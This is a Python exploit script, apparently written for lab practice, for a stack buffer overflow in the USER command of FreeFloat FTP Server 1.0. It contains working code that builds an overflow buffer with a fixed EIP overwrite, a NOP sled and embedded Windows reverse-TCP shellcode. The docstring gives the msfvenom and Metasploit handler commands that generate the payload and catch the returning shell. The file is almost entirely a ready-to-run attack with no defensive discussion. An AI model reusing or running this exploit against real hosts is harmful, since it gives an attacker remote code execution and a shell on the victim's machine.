#!/usr/bin/env python3

import logging
import random
import socket
import string
import struct
import sys

logging.basicConfig(level=logging.DEBUG)
RHOST = "192.168.44.154"
RPORT = 21
BADCHARS = [0x00, 0x0a, 0x0d]

"""
REF: https://www.cvedetails.com/cve/CVE-2012-5106/
 Stack-based buffer overflow in FreeFloat FTP Server 1.0 allows remote authenticated users to execute arbitrary code via a long string in a PUT command. 

( doesn't appear to be an actual cve for the overflow in USER )

msfvenom -p windows/shell/reverse_tcp LHOST=$lhost LPORT=443 -f python EXITFUNC=thread -a x86 -b "\x00\x0a\x0d" -v shellcode

cat > connect.rc << EOF
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set lport 443
set lhost eth0
exploit -j
python3 exploit.py
EOF
msfconsole -r connect.rc

"""

shellcode =  b""
shellcode += b"\xbd\xe3\xa7\x23\x98\xdb\xcd\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x5b\x31\x6f\x14\x83\xef\xfc"
shellcode += b"\x03\x6f\x10\x01\x52\xdf\x70\x47\x9d\x20\x81"
shellcode += b"\x27\x17\xc5\xb0\x67\x43\x8d\xe3\x57\x07\xc3"
shellcode += b"\x0f\x1c\x45\xf0\x84\x50\x42\xf7\x2d\xde\xb4"
shellcode += b"\x36\xad\x72\x84\x59\x2d\x88\xd9\xb9\x0c\x43"
shellcode += b"\x2c\xbb\x49\xb9\xdd\xe9\x02\xb6\x70\x1e\x26"
shellcode += b"\x82\x48\x95\x74\x03\xc9\x4a\xcc\x22\xf8\xdc"
shellcode += b"\x46\x7d\xda\xdf\x8b\xf6\x53\xf8\xc8\x32\x2d"
shellcode += b"\x73\x3a\xc9\xac\x55\x72\x32\x02\x98\xba\xc1"
shellcode += b"\x5a\xdc\x7d\x39\x29\x14\x7e\xc4\x2a\xe3\xfc"
shellcode += b"\x12\xbe\xf0\xa7\xd1\x18\xdd\x56\x36\xfe\x96"
shellcode += b"\x55\xf3\x74\xf0\x79\x02\x58\x8a\x86\x8f\x5f"
shellcode += b"\x5d\x0f\xcb\x7b\x79\x4b\x88\xe2\xd8\x31\x7f"
shellcode += b"\x1a\x3a\x9a\x20\xbe\x30\x37\x35\xb3\x1a\x50"
shellcode += b"\xfa\xfe\xa4\xa0\x94\x89\xd7\x92\x3b\x22\x70"
shellcode += b"\x9f\xb4\xec\x87\x96\xd2\x0e\x57\x10\xb2\xf0"
shellcode += b"\x58\x61\x9b\x36\x0c\x31\xb3\x9f\x2d\xda\x43"
shellcode += b"\x1f\xf8\x77\x49\xb7\xc3\x20\x61\xc2\xac\x32"
shellcode += b"\x79\xcd\x97\xba\x9f\x9d\xb7\xec\x0f\x5e\x68"
shellcode += b"\x4d\xff\x36\x62\x42\x20\x26\x8d\x88\x49\xcd"
shellcode += b"\x62\x65\x22\x7a\x1a\x2c\xb8\x1b\xe3\xfa\xc5"
shellcode += b"\x1c\x6f\x0f\x3a\xd2\x98\x7a\x28\x03\xff\x84"
shellcode += b"\xb0\xd4\x6a\x85\xda\xd0\x3c\xd2\x72\xdb\x19"
shellcode += b"\x14\xdd\x24\x4c\x26\x19\xda\x11\x1f\x52\xed"
shellcode += b"\x87\x1f\x0c\x12\x48\xa0\xcc\x44\x02\xa0\xa4"
shellcode += b"\x30\x76\xf3\xd1\x3e\xa3\x67\x4a\xab\x4c\xde"
shellcode += b"\x3f\x7c\x25\xdc\x66\x4a\xea\x1f\x4d\xc8\xed"
shellcode += b"\xe0\x10\xe7\x55\x89\xea\xb7\x65\x49\x80\x37"
shellcode += b"\x36\x21\x5f\x17\xb9\x81\xa0\xb2\x92\x89\x2b"
shellcode += b"\x53\x50\x2b\x2c\x7e\x34\xf5\x2d\x8d\xed\x06"
shellcode += b"\x54\xfe\x12\xe7\xa9\x16\x77\xe7\xaa\x16\x89"
shellcode += b"\xdb\x7d\x2f\xff\x1a\xbe\x14\xe0\x80\x6a\x61"
shellcode += b"\x89\x1c\xff\xc8\xd4\x9e\x2a\x0e\xe1\x1c\xde"
shellcode += b"\xef\x16\x3c\xab\xea\x53\xfa\x40\x87\xcc\x6f"
shellcode += b"\x66\x34\xec\xa5"

def check(RHOST, RPORT, banner, timeout=0.1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((RHOST, RPORT))
        d = s.recv(1024).decode()
        s.close()
        if banner in d:
            return True
        else:
            return False
    except socket.error as e:
        logging.info(f"Exploit failed with error: {e}")
    return False

def main(RHOST,RPORT,shellcode, BADCHARS, timeout=0.1):
    
    # check to make sure there aren't any badchars in shellcode
    for b in shellcode:
        if b in BADCHARS:
            logging.info(f"Shellcode contains the following badchar: {hex(b)}")
            sys.exit(1)
    
    # configure evil buf
    junk = "".join([string.ascii_letters[random.randint(0,len(string.ascii_letters)-1)] for b in range(0,230) if b not in BADCHARS]).encode()

    buf = b""
    buf += b"USER "
    buf += junk
    buf += b"a" * (230 - len(junk))
    buf += struct.pack("<I", 0x77DEF049) # eip
    buf += b"\x90" * 50 # nops
    buf += shellcode
    buf += b"d" * 300
    buf += b"\r\n"

    # configure socket and send data
    try:
        logging.info(f"Connecting to {RHOST}:{RPORT}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((RHOST, RPORT))
        s.recv(1024)
        logging.info(f"Sending {len(buf)} bytes of data")
        s.send((buf))
        s.recv(1024)
        s.close()
        logging.info(f"Socket closed")

    # gracefully fail if timeout
    except socket.error as e:
        logging.info(f"Exploit failed with error: {e}")

    logging.info(f"Finished")
    return


if __name__=="__main__":
    if(check(RHOST,RPORT,"FreeFloat Ftp Server (Version 1.00).")):
        logging.info(f"{RHOST} appears to be vulnerable")
        main(RHOST,RPORT,shellcode,BADCHARS)
    else:
        logging.info(f"{RHOST} doesn't appear to be vulnerable")
